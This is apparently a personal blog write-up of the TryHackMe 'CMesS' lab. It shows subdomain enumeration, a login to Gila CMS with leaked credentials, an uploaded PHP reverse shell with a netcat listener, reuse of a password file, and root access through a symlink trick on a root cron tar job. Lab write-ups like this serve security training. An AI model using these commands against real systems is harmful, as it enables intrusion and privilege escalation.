<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dawnl3ss :: CMesS THM Write-Up</title>

    <meta property="og:title" content="Dawnless | CMesS THM Write-Up">
    <meta property="og:image" content="http://dawnl3ss.me/assets/img/ogimage.jpg">
    <meta property="og:description" content="CMesS TryHackMe Write-Up by Dawnl3ss. Gila CMS subdomain enum + file upload RCE + tar cron symlink privesc.">
    <meta name="author" content="Dawnless">

    <link rel="icon" href="/public/img/icon.jpg" type="image/png">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600&display=swap">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/MaterialDesign-Webfont/7.4.47/css/materialdesignicons.min.css">
    <link rel="stylesheet" href="/public/css/components/wtpage.css">
</head>
<body>

<header class="header" id="header">
    <div class="container">
        <nav class="nav">
            <a href="/" class="nav-logo">
                <img src="/public/img/icon.jpg" alt="Dawnl3ss">
                <div class="logo-text">dawnl3ss<span>@parrot</span></div>
            </a>
            <ul class="nav-list" id="navList">
                <li><a href="/" class="nav-link">Home</a></li>
                <li><a href="/writeups" class="nav-link">Writeups</a></li>
                <li><a href="#recon" class="nav-link">Recon</a></li>
                <li><a href="#access" class="nav-link">Access</a></li>
                <li><a href="#latmov" class="nav-link">Lat Mov</a></li>
                <li><a href="#privesc" class="nav-link">PrivEsc</a></li>
            </ul>
            <button class="nav-toggle" id="navToggle" aria-label="Toggle menu">
                <span></span><span></span><span></span>
            </button>
        </nav>
    </div>
</header>

<section class="writeup-hero">
    <div class="container hero-inner">
        <div class="breadcrumb">
            <a href="/"><i class="mdi mdi-home"></i> Home</a>
            <i class="mdi mdi-chevron-right"></i>
            <a href="/writeups">Writeups</a>
            <i class="mdi mdi-chevron-right"></i>
            <span>CMesS</span>
        </div>

        <div class="writeup-banner">
            <img
                class="box-avatar"
                src="https://tryhackme-images.s3.amazonaws.com/room-icons/1516b0c85bb9f7312a88638df5b0f3af.png"
                alt="CMesS THM"
            >
            <div class="writeup-meta">
                <h1>THM - <span>CMesS</span> Write-Up</h1>
                <div class="meta-row">
                    <span class="meta-badge difficulty-medium"><i class="mdi mdi-circle-slice-4"></i> Medium</span>
                    <span class="meta-badge os-linux"><i class="mdi mdi-linux"></i> Linux</span>
                    <span class="meta-badge type-web"><i class="mdi mdi-web"></i> Web App</span>
                    <span class="meta-badge platform"><i class="mdi mdi-flag-checkered"></i> TryHackMe</span>
                </div>
                <div class="tag-list">
                    <span class="tag">security</span>
                    <span class="tag">cms</span>
                    <span class="tag">gila</span>
                    <span class="tag">subdomain</span>
                    <span class="tag">file-upload</span>
                    <span class="tag">tar</span>
                    <span class="tag">cron</span>
                </div>
            </div>
        </div>
    </div>
</section>

<div class="writeup-layout">

    <aside class="toc-sidebar">
        <nav class="toc-box">
            <p class="toc-title"><i class="mdi mdi-format-list-bulleted"></i> Contents</p>
            <ul class="toc-list">
                <li><a href="#intro"><i class="mdi mdi-information-outline"></i> Introduction</a></li>
                <li><a href="#recon"><i class="mdi mdi-radar"></i> Reconnaissance</a></li>
                <li><a href="#access"><i class="mdi mdi-console"></i> Getting a Shell</a></li>
                <li><a href="#latmov"><i class="mdi mdi-swap-horizontal"></i> Lateral Movement</a></li>
                <li><a href="#privesc"><i class="mdi mdi-crown-outline"></i> Privilege Escalation</a></li>
            </ul>
        </nav>
    </aside>

    <main class="writeup-content">

        <section class="wt-section" id="intro">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-information-outline"></i></div>
                <div>
                    <span class="section-num">01 /</span>
                    <h2>Introduction</h2>
                </div>
            </div>

            <p>
                <a href="https://tryhackme.com/room/cmess" target="_blank">CMesS</a> is a free room on TryHackMe.
                The objective is to compromise the target and retrieve both the user and root flags.
            </p>

            <div class="box-info-card">
                <div class="box-info-item">
                    <i class="mdi mdi-flag-variant"></i>
                    <span class="bi-label">Name</span>
                    <span class="bi-value">CMesS</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-gauge"></i>
                    <span class="bi-label">Difficulty</span>
                    <span class="bi-value" style="color:#ffbd2e">Medium</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-linux"></i>
                    <span class="bi-label">OS</span>
                    <span class="bi-value">Linux</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-web"></i>
                    <span class="bi-label">Type</span>
                    <span class="bi-value">Web App</span>
                </div>
            </div>

            <p>Let's dive into the challenge!</p>
        </section>

        <section class="wt-section" id="recon">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-radar"></i></div>
                <div>
                    <span class="section-num">02 /</span>
                    <h2>Reconnaissance</h2>
                </div>
            </div>

            <p>After adding the machine IP to <code class="inline">/etc/hosts</code>, I ran an NMAP scan:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">nmap scan</span>
                    <button class="tb-copy" data-target="cmd1">copy</button>
                </div>
                <pre id="cmd1"><span class="prompt">$</span> <span class="cmd">nmap -A cmess.thm</span>
<span class="output">PORT   STATE SERVICE VERSION
<span class="success">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8</span>
<span class="success">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span>
| http-robots.txt: 3 disallowed entries
|_/src/ /themes/ /lib/
<span class="highlight">|_http-generator: Gila CMS</span></span></pre>
            </div>

            <p>The site runs <strong>Gila CMS</strong>. The homepage shows nothing useful without credentials, but a room hint suggests enumerating subdomains:</p>

            <div class="writeup-img-wrap">
                <img src="/public/img/thm/cmess/home_page.png" alt="Gila CMS homepage">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// cmess.thm - Gila CMS homepage</div>
            </div>

            <div class="writeup-img-wrap">
                <img src="/public/img/thm/cmess/hint.png" alt="Room hint">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// Room hint - enumerate subdomains</div>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">wfuzz - subdomain enumeration</span>
                    <button class="tb-copy" data-target="cmd2">copy</button>
                </div>
                <pre id="cmd2"><span class="prompt">$</span> <span class="cmd">wfuzz -c -w Subdomain.txt -u "http://cmess.thm/" -H "Host: FUZZ.cmess.thm" --hl 107</span>
<span class="output">ID           Response   Lines    Word    Chars    Payload
=====================================================================
<span class="success">000000015:   200        30 L     104 W   934 Ch   "dev"</span></span></pre>
            </div>

            <p>I added <code class="inline">dev.cmess.thm</code> to <code class="inline">/etc/hosts</code> and visited the subdomain:</p>

            <div class="writeup-img-wrap">
                <img src="/public/img/thm/cmess/subd_page.png" alt="dev.cmess.thm">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// dev.cmess.thm - leaked credentials for andre</div>
            </div>

            <div class="callout success">
                <i class="mdi mdi-key-variant"></i>
                <p>Credentials found: <code class="inline">andre@cmess.thm:[REDACTED]</code></p>
            </div>
        </section>

        <section class="wt-section" id="access">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-console"></i></div>
                <div>
                    <span class="section-num">03 /</span>
                    <h2>Getting a Shell</h2>
                </div>
            </div>

            <p>Logging into the Gila CMS admin panel with the discovered credentials:</p>

            <div class="writeup-img-wrap">
                <img src="/public/img/thm/cmess/form_fullfiled.png" alt="Login form">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// Gila CMS - login with andre's credentials</div>
            </div>

            <div class="writeup-img-wrap">
                <img src="/public/img/thm/cmess/home_dash.png" alt="Admin dashboard">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// Gila CMS - admin dashboard</div>
            </div>

            <p>The dashboard has a file manager that allows uploading arbitrary files. I uploaded a <a href="https://github.com/4m4Sec/php-reverse-shell" target="_blank">PHP reverse shell</a> directly - no extension filter:</p>

            <div class="writeup-img-wrap">
                <img src="/public/img/thm/cmess/dash_upload.png" alt="File upload feature">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// Gila CMS - unrestricted file upload</div>
            </div>

            <div class="writeup-img-wrap">
                <img src="/public/img/thm/cmess/uploaded_success.png" alt="Upload success">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// rev-shell.php uploaded successfully</div>
            </div>

            <p>The file lands in the <code class="inline">assets/</code> directory:</p>

            <div class="writeup-img-wrap">
                <img src="/public/img/thm/cmess/upload_loc.png" alt="Upload location">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// File location - cmess.thm/assets/rev-shell.php</div>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">netcat - reverse shell</span>
                    <button class="tb-copy" data-target="cmd3">copy</button>
                </div>
                <pre id="cmd3"><span class="prompt">$</span> <span class="cmd">nc -lnvp 4444</span>
<span class="output">connect to [10.18.43.24] from (UNKNOWN) [10.10.91.94] 38396
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$</span> <span class="cmd">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
<span class="success">www-data@cmess:/$</span></pre>
            </div>
        </section>

        <section class="wt-section" id="latmov">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-swap-horizontal"></i></div>
                <div>
                    <span class="section-num">04 /</span>
                    <h2>Lateral Movement</h2>
                </div>
            </div>

            <p>As <code class="inline">www-data</code> I checked the crontab first:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">/etc/crontab</span>
                    <button class="tb-copy" data-target="cmd4">copy</button>
                </div>
                <pre id="cmd4"><span class="output">www-data@cmess:/tmp$</span> <span class="cmd">cat /etc/crontab</span>
<span class="output">*/2 *   * * *   root    cd /home/andre/backup && <span class="warning">tar -zcf /tmp/andre_backup.tar.gz *</span></span></pre>
            </div>

            <p>The tar archive turned out to be a rabbit hole. Continuing enumeration, I found a world-writable backup file in <code class="inline">/opt</code>:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">/opt - hidden password file</span>
                    <button class="tb-copy" data-target="cmd5">copy</button>
                </div>
                <pre id="cmd5"><span class="output">www-data@cmess:/opt$</span> <span class="cmd">ls -la</span>
<span class="output"><span class="success">-rwxrwxrwx 1 root root 36 Feb  6  2020 .password.bak</span></span>
<span class="output">www-data@cmess:/opt$</span> <span class="cmd">cat .password.bak</span>
<span class="output">andres backup password
<span class="success">[REDACTED]</span></span></pre>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">su andre + user flag</span>
                    <button class="tb-copy" data-target="cmd6">copy</button>
                </div>
                <pre id="cmd6"><span class="output">www-data@cmess:/opt$</span> <span class="cmd">su andre</span>
<span class="output">Password:
<span class="success">andre@cmess:/opt$</span>

andre@cmess:/opt$</span> <span class="cmd">cat /home/andre/user.txt</span>
<span class="success">thm{REDACTED}</span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-flag"></i>
                <p><strong>User flag captured!</strong> Now let's escalate to root.</p>
            </div>
        </section>

        <section class="wt-section" id="privesc">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-crown-outline"></i></div>
                <div>
                    <span class="section-num">05 /</span>
                    <h2>Privilege Escalation</h2>
                </div>
            </div>

            <p>
                The cron job runs <code class="inline">tar -zcf /tmp/andre_backup.tar.gz *</code> from <code class="inline">/home/andre/backup/</code> as root.
                By replacing the <code class="inline">backup/</code> directory with a symlink to <code class="inline">/root/</code>, the wildcard expansion will compress the root directory instead.
            </p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">cron tar symlink exploit</span>
                    <button class="tb-copy" data-target="cmd7">copy</button>
                </div>
                <pre id="cmd7"><span class="output">andre@cmess:~$</span> <span class="cmd">mv backup/ backup.bak/</span>
<span class="output">andre@cmess:~$</span> <span class="cmd">ln -s /root/ backup</span>
<span class="output"><span class="highlight">Wait ~2 minutes for the cron to trigger...</span></span>

<span class="output">andre@cmess:~$</span> <span class="cmd">python3 -m http.server 8080</span>
<span class="output">Serving HTTP on 0.0.0.0 port 8080 ...</span></pre>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">download and extract root archive</span>
                    <button class="tb-copy" data-target="cmd8">copy</button>
                </div>
                <pre id="cmd8"><span class="prompt">$</span> <span class="cmd">wget http://cmess.thm:8080/andre_backup.tar.gz</span>
<span class="prompt">$</span> <span class="cmd">tar -zxf andre_backup.tar.gz</span>
<span class="prompt">$</span> <span class="cmd">cat root.txt</span>
<span class="success">thm{REDACTED}</span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-crown"></i>
                <p><strong>Root flag captured!</strong> Box fully pwned via subdomain enum -> Gila CMS file upload -> password reuse -> tar cron symlink. 💀</p>
            </div>
        </section>

    </main>
</div>

<footer class="footer">
    <div class="container footer-content">
        <div class="footer-social">
            <a href="https://github.com/dawnl3ss/" target="_blank"><i class="mdi mdi-github"></i></a>
            <a href="https://discord.gg/hardware" target="_blank"><i class="mdi mdi-discord"></i></a>
            <a href="http://dawnl3ss.me/" target="_blank"><i class="mdi mdi-web"></i></a>
            <a href="https://twitter.com/dawnl3ss" target="_blank"><i class="mdi mdi-twitter"></i></a>
        </div>
        <nav class="footer-nav">
            <a href="/">Home</a>
            <a href="/writeups">Writeups</a>
            <a href="mailto:dawnl3ss@protonmail.com">Contact</a>
        </nav>
        <p class="footer-copyright">Copyright Dawnl3ss © 2025 - <span style="color:var(--primary)">dawnl3ss@parrot-sec</span></p>
    </div>
</footer>

<div class="lightbox-overlay" id="lightbox">
    <button class="lightbox-close" id="lightboxClose">&times;</button>
    <img class="lightbox-img" id="lightboxImg" src="" alt="">
</div>

<script src="/public/js/wtpage.js"></script>
</body>
</html>